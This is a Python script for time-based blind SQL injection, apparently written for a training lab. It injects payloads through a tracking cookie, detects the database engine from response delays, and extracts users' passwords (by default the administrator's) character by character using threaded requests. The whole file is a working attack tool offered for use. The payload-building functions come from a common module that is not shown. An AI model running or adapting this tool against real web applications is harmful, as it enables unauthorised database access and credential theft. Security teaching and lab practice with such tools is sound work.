#!/usr/bin/env python3
import sys
import time
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from colorama import Fore, Style

try:
    from tools.common import (
        DEFAULT_HEADERS, setup_logger, banner, log_info, log_warn, log_error,
        build_charset, make_session, make_proxies, timestamp_log_name,
        prompt_url, prompt_tracking, prompt_cookie_name, prompt_session_cookie,
        prompt_users, prompt_length, prompt_proxy, prompt_workers,
        prompt_special, prompt_timeout, prompt_dbms,
        prompt_time_delay, prompt_time_threshold,
        build_time_payload, build_time_probe,
    )
except ImportError:
    from common import (
        DEFAULT_HEADERS, setup_logger, banner, log_info, log_warn, log_error,
        build_charset, make_session, make_proxies, timestamp_log_name,
        prompt_url, prompt_tracking, prompt_cookie_name, prompt_session_cookie,
        prompt_users, prompt_length, prompt_proxy, prompt_workers,
        prompt_special, prompt_timeout, prompt_dbms,
        prompt_time_delay, prompt_time_threshold,
        build_time_payload, build_time_probe,
    )


class TimeSQLiEngine:
    def __init__(self, args):
        self.url = args.url
        self.base_id = args.tracking
        self.cookie_name = args.cookie
        self.session_cookie = args.session
        self.target_users = [u.strip() for u in args.users.split(',') if u.strip()]
        self.length = args.length
        self.use_special = args.special
        self.workers = max(1, args.workers)
        self.timeout = args.timeout
        self.log_file = args.log
        self.delay = args.delay
        self.threshold = args.threshold
        self.logger = setup_logger(self.log_file, "TimeSQLi")
        self.headers = dict(DEFAULT_HEADERS)
        self.proxies = make_proxies(args.proxy)
        self.charset = build_charset(self.use_special)
        self.session = make_session()
        self.dbms = (getattr(args, "dbms", "auto") or "auto").lower()

    def _send_request(self, payload):
        cookies = {self.cookie_name: payload}
        if self.session_cookie:
            cookies["session"] = self.session_cookie
        start = time.perf_counter()
        try:
            self.session.get(
                self.url, cookies=cookies, headers=self.headers,
                proxies=self.proxies, verify=False, timeout=self.timeout,
                allow_redirects=False
            )
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return False
        elapsed = time.perf_counter() - start
        self.logger.debug(f"Payload elapsed={elapsed:.2f}s thr={self.threshold}s :: {payload}")
        return elapsed >= self.threshold

    def _detect_dbms(self):
        log_info(f"Auto-detecting DBMS (time-based, delay={self.delay}s)...")
        for dbms in ["postgres", "mysql", "oracle", "mssql"]:
            payload = build_time_probe(dbms, self.base_id, self.delay)
            if not payload:
                continue
            if self._send_request(payload):
                log_info(f"Detected DBMS: {Fore.CYAN}{dbms}{Style.RESET_ALL}")
                return dbms
        log_warn("Auto-detect failed; falling back to 'postgres'.")
        return "postgres"

    def _probe(self):
        log_info("Probing Time-based injection...")
        if self.dbms == "auto":
            self.dbms = self._detect_dbms()
        payload = build_time_probe(self.dbms, self.base_id, self.delay)
        if self._send_request(payload):
            log_info(f"Time payload confirmed (delay {self.delay}s, dbms: {self.dbms})")
            return True
        log_error("Time probe failed. Increase delay or adjust threshold.")
        return False

    def _extract_char(self, user, position):
        found = None
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = {}
            for c in self.charset:
                p = build_time_payload(self.dbms, self.base_id, user, position, c, self.delay)
                futs[ex.submit(self._send_request, p)] = c
            for fut in as_completed(futs):
                c = futs[fut]
                try:
                    if fut.result():
                        found = c
                        for f in futs:
                            if not f.done():
                                f.cancel()
                        break
                except Exception as e:
                    self.logger.debug(f"Future error: {e}")
        return found

    def extract_password(self, user):
        log_info(f"Starting extraction for user: {Fore.CYAN}{user}{Style.RESET_ALL}")
        if not self._probe():
            return None
        log_info(f"Using provided length: {self.length}")
        password = ""
        for pos in range(1, self.length + 1):
            sys.stdout.write(f"\r[+] {user} | Pos {pos}/{self.length} | Current: {Fore.YELLOW}{password}{Style.RESET_ALL} ")
            sys.stdout.flush()
            c = self._extract_char(user, pos)
            if c:
                password += c
                self.logger.info(f"Position {pos}: Found '{c}'")
            else:
                log_warn(f"Character not found at position {pos}. Stopping.")
                break
        sys.stdout.write("\n")
        return password

    def run(self):
        results = {}
        for user in self.target_users:
            log_info(f"{'='*20} Target: {user} {'='*20}")
            pwd = self.extract_password(user)
            if pwd:
                results[user] = pwd
                log_info(f"Success! Password for {Fore.CYAN}{user}{Style.RESET_ALL} is: {Fore.GREEN}{pwd}{Style.RESET_ALL}")
            else:
                log_error(f"Failed to extract password for {user}.")
        self._summary(results)

    def _summary(self, results):
        print(f"\n{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA} FINAL RESULTS — TIME MODE ({self.dbms}, delay={self.delay}s) {Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        for u, p in results.items():
            print(f"{Fore.CYAN}{u:15} {Style.RESET_ALL} : {Fore.GREEN}{p}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
        print(f"\n[+] Results logged to: {self.log_file}")


def interactive():
    banner(subtitle="T I M E   M O D E   ( p g _ s l e e p / S L E E P )")
    print(f"\n{Fore.YELLOW}[*] Interactive Mode — Time-based lab{Style.RESET_ALL}\n")
    args = argparse.Namespace()
    args.url = prompt_url()
    args.tracking = prompt_tracking()
    args.cookie = prompt_cookie_name()
    args.session = prompt_session_cookie()
    args.users = prompt_users()
    args.length = prompt_length()
    args.dbms = prompt_dbms()
    args.delay = prompt_time_delay(default=10)
    args.threshold = prompt_time_threshold(default=max(1, args.delay - 3))
    args.proxy = prompt_proxy()
    args.workers = prompt_workers(default=1)
    args.timeout = prompt_timeout(default=args.delay + 10)
    args.special = prompt_special()
    args.log = timestamp_log_name("time_sqli")
    return args


def build_parser():
    p = argparse.ArgumentParser(description="Time-based Blind SQLi (pg_sleep / SLEEP / WAITFOR)", add_help=False)
    p.add_argument("-u", "--url", required=True)
    p.add_argument("-t", "--tracking", default="182--")
    p.add_argument("-c", "--cookie", default="TrackingId")
    p.add_argument("-sc", "--session", default=None)
    p.add_argument("-usr", "--users", default="administrator")
    p.add_argument("-l", "--length", type=int, required=True, help="Password length (REQUIRED)")
    p.add_argument("-d", "--delay", type=int, default=10, help="Sleep seconds per TRUE condition")
    p.add_argument("-th", "--threshold", type=int, default=7, help="Elapsed seconds >= threshold => TRUE")
    p.add_argument("-p", "--proxy", default=None)
    p.add_argument("-w", "--workers", type=int, default=1)
    p.add_argument("-T", "--timeout", type=int, default=25)
    p.add_argument("-s", "--special", action="store_true")
    p.add_argument("-o", "--log", default=timestamp_log_name("time_sqli"))
    p.add_argument("-db", "--dbms", default="auto", choices=["auto", "mysql", "postgres", "oracle", "mssql", "sqlite"])
    return p


def main():
    if len(sys.argv) == 1:
        args = interactive()
    else:
        args = build_parser().parse_args()

    if not args.url.startswith(("http://", "https://")):
        log_error("URL must start with http:// or https://")
        sys.exit(1)
    if not args.length or args.length <= 0:
        log_error("Password length (-l) is required and must be positive.")
        sys.exit(1)
    if args.threshold >= args.delay:
        log_warn(f"Threshold ({args.threshold}s) >= delay ({args.delay}s); detection may be unreliable.")
    if args.timeout <= args.delay:
        log_warn(f"Timeout ({args.timeout}s) <= delay ({args.delay}s); requests may time out before detection.")

    engine = TimeSQLiEngine(args)
    try:
        engine.run()
    except KeyboardInterrupt:
        log_warn("\n[!] Interrupted by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()